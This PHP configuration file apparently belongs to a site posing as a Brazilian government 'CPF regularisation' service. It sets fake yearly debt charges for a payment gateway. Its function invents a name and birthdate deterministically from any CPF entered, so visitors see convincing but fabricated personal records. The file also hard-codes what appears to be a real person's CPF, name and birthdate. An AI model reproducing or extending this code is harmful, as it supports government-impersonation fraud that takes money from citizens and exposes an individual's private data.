<?php
// Configurações Globais do Site de Reconstrução Fiscal

// Valores de débito para cada ano (em centavos)
define('VALOR_2020', 9401);  // R$ 94,01 (Obrigatório)
define('VALOR_2021', 8343);  // R$ 83,43
define('VALOR_2022', 9125);  // R$ 91,25
define('VALOR_2023', 9987);  // R$ 99,87
define('VALOR_2024', 10845); // R$ 108,45
define('VALOR_2025', 12458); // R$ 124,58

// Nome do Produto a ser exibido no gateway
define('PRODUTO_NOME', 'Regularização CPF Gov BR');

/**
 * Função para obter dados fictícios ou reais com base no CPF (apenas números)
 * Garante que o CPF de teste exiba os dados originais do projeto.
 */
function obterDadosCPF($cpf_limpo) {
    // CPF de teste original
    if ($cpf_limpo === '46620588808' || $cpf_limpo === '466.205.888-08') {
        return [
            'nome' => 'Caique Dos Santos Pires',
            'nascimento' => '09/11/2004'
        ];
    }
    
    // Listas para geração determinística
    $primeiros_nomes = ['José', 'Maria', 'João', 'Ana', 'Antônio', 'Francisco', 'Carlos', 'Paulo', 'Lucas', 'Luiz', 'Marcos', 'Juliana', 'Fernanda', 'Patrícia', 'Camila', 'Aline', 'Sandra', 'Roberto', 'Marcos', 'Bruno'];
    $sobrenomes = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Gomes', 'Costa', 'Ribeiro', 'Martins', 'Carvalho', 'Almeida', 'Lopes', 'Soares', 'Dias', 'Vieira', 'Rocha'];
    
    // Usa o CPF como semente para geração determinística
    $semente = (int)substr($cpf_limpo, 0, 8);
    srand($semente);
    
    $nome1 = $primeiros_nomes[rand(0, count($primeiros_nomes) - 1)];
    $nome2 = $sobrenomes[rand(0, count($sobrenomes) - 1)];
    $nome3 = $sobrenomes[rand(0, count($sobrenomes) - 1)];
    
    $dia = str_pad(rand(1, 28), 2, '0', STR_PAD_LEFT);
    $mes = str_pad(rand(1, 12), 2, '0', STR_PAD_LEFT);
    $ano = rand(1965, 2005);
    
    srand(); // Restaura semente padrão
    
    return [
        'nome' => "$nome1 $nome2 $nome3",
        'nascimento' => "$dia/$mes/$ano"
    ];
}
